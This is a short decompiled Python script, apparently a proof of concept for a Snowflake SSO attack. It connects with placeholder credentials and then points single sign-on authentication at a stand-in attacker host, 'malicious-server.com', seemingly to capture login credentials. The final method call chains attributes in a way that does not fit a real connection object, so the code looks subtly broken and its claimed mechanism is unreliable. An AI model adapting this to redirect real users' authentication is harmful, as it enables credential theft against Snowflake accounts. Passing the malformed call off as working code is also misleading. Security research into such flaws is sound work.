# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 228_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 453 bytes
import snowflake.connector
conn = snowflake.connector.connect(user="username",
  password="password",
  account="account_name",
  warehouse="warehouse_name",
  database="database_name",
  schema="schema_name",
  sso_browser_auth=True)
sso_url = "https://malicious-server.com/snowflake_sso"
conn.snowflake.connector.SnowflakeConnection.sso_browser_auth(sso_url)

# okay decompiling 228_1.pyc
